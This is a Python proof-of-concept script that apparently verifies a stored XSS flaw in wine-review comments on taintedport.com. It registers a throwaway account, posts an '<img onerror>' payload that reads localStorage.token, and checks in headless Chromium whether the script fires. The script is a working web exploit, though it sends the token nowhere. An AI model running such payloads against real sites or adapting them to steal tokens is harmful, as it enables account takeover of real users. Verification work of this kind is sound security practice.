     1	#!/usr/bin/env python3
     2	"""Verify: Stored XSS in wine review 'comment' field on taintedport.com.
     3	
     4	Registers a fresh attacker (open registration), submits a review whose 'comment'
     5	contains an <img onerror=...> payload, and confirms the API returns the payload
     6	byte-for-byte in GET /wines/{id}/reviews. Then loads the wine detail page in a
     7	headless Chromium and checks whether the payload executes in a JavaScript
     8	context that can read localStorage.token — the SPA's authentication credential.
     9	
    10	Exit code 0 = vulnerable. Exit code 1 = fixed / error.
    11	
    12	Required environment variables:
    13	    (none)  — registers a fresh account each run.
    14	
    15	Optional (override defaults):
    16	    TARGET_UI       SPA base URL (default: https://taintedport.com)
    17	    TARGET_API      API base URL (default: https://api.taintedport.com)
    18	    WINE_ID         Wine to test against (default: 17)
    19	
    20	Usage:
    21	    pip install requests playwright && playwright install chromium
    22	    python3 verify.py
    23	"""
    24	import os
    25	import sys
    26	import json
    27	import random
    28	import urllib3
    29	import requests
    30	
    31	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    32	
    33	TARGET_UI = os.environ.get("TARGET_UI", "https://taintedport.com")
    34	TARGET_API = os.environ.get("TARGET_API", "https://api.taintedport.com")
    35	WINE_ID = int(os.environ.get("WINE_ID", "17"))
    36	
    37	
    38	def check():
    39	    marker = f"XSSVERIFY_{random.randint(100000, 999999)}"
    40	
    41	    # 1. Register throwaway attacker
    42	    email = f"xss-verify-{random.randint(100000, 9999999)}@example.com"
    43	    r = requests.post(
    44	        f"{TARGET_API}/auth/register",
    45	        json={"name": "XV", "email": email, "password": "Pass1234!"},
    46	        verify=False, timeout=15,
    47	    )
    48	    if r.status_code not in (200, 201):
    49	        print(f"[ERROR] Registration failed HTTP {r.status_code}: {r.text[:200]}")
    50	        sys.exit(1)
    51	    token = r.json()["token"]
    52	
    53	    # 2. Fake victim JWT (server does not have to accept it — the SPA only reads
    54	    # localStorage.token in the injected JS; leaking any localStorage value
    55	    # proves the same-origin sink.)
    56	    fake_victim_jwt = "VICTIM_JWT_" + marker
    57	
    58	    # 3. Post poisoned review
    59	    payload = (
    60	        "<img src=x onerror=\"window.__xss_fired=1;"
    61	        f"document.title='{marker}:'+"
    62	        "(localStorage.getItem('token')||'NULL').slice(0,80)\">POC-MARKER"
    63	    )
    64	    r = requests.post(
    65	        f"{TARGET_API}/wines/{WINE_ID}/reviews",
    66	        headers={"Authorization": f"Bearer {token}"},
    67	        json={"rating": 5, "comment": payload},
    68	        verify=False, timeout=15,
    69	    )
    70	    if r.status_code not in (200, 201):
    71	        print(f"[NOT VULNERABLE] Review submission failed HTTP {r.status_code}: {r.text[:200]}")
    72	        sys.exit(1)
    73	    review_id = r.json().get("review_id")
    74	
    75	    # 4. Confirm verbatim storage via API
    76	    r = requests.get(f"{TARGET_API}/wines/{WINE_ID}/reviews", verify=False, timeout=15)
    77	    stored = next((rv for rv in r.json().get("reviews", []) if rv.get("id") == review_id), None)
    78	    if not stored:
    79	        print(f"[ERROR] Could not fetch review_id={review_id}")
    80	        sys.exit(1)
    81	    api_verbatim = stored["comment"] == payload
    82	
    83	    # 5. Load the wine page in headless Chromium and check execution
    84	    try:
    85	        from playwright.sync_api import sync_playwright
    86	    except ImportError:
    87	        # If playwright isn't installed, still return VULNERABLE if the API stores raw HTML —
    88	        # this is a necessary condition even without confirming browser execution.
    89	        if api_verbatim:
    90	            print(f"[VULNERABLE] Server stores review comment verbatim (payload returned unchanged). "
    91	                  f"Install playwright to also confirm client-side execution.")
    92	            sys.exit(0)
    93	        print("[NOT VULNERABLE] Server sanitised the comment.")
    94	        sys.exit(1)
    95	
    96	    fired = False
    97	    title = ""
    98	    with sync_playwright() as p:
    99	        browser = p.chromium.launch(headless=True)
   100	        ctx = browser.new_context()
   101	        ctx.add_init_script(f"localStorage.setItem('token', {json.dumps(fake_victim_jwt)});")
   102	        page = ctx.new_page()
   103	        page.on("dialog", lambda d: d.accept())  # dismiss any pre-existing XSS alerts
   104	        try:
   105	            page.goto(f"{TARGET_UI}/wines/{WINE_ID}", wait_until="networkidle", timeout=30000)
   106	        except Exception as e:
   107	            print(f"[ERROR] Failed to load wine page: {e}")
   108	            browser.close()
   109	            sys.exit(1)
   110	        fired = bool(page.evaluate("() => window.__xss_fired === 1"))
   111	        title = page.title()
   112	        browser.close()
   113	
   114	    leaked_prefix_ok = title.startswith(f"{marker}:") and fake_victim_jwt[:20] in title
   115	
   116	    if fired and leaked_prefix_ok:
   117	        print(f"[VULNERABLE] Stored XSS confirmed on {TARGET_UI}/wines/{WINE_ID} — "
   118	              f"injected script executed and read localStorage.token. title='{title[:120]}'")
   119	        sys.exit(0)
   120	    if api_verbatim and not fired:
   121	        print(f"[NOT VULNERABLE] API stores comment verbatim but SPA no longer executes it "
   122	              f"(title='{title[:120]}', fired={fired}).")
   123	        sys.exit(1)
   124	    print(f"[NOT VULNERABLE] API sanitised comment or payload did not execute "
   125	          f"(api_verbatim={api_verbatim}, fired={fired}, title='{title[:120]}').")
   126	    sys.exit(1)
   127	
   128	
   129	if __name__ == "__main__":
   130	    check()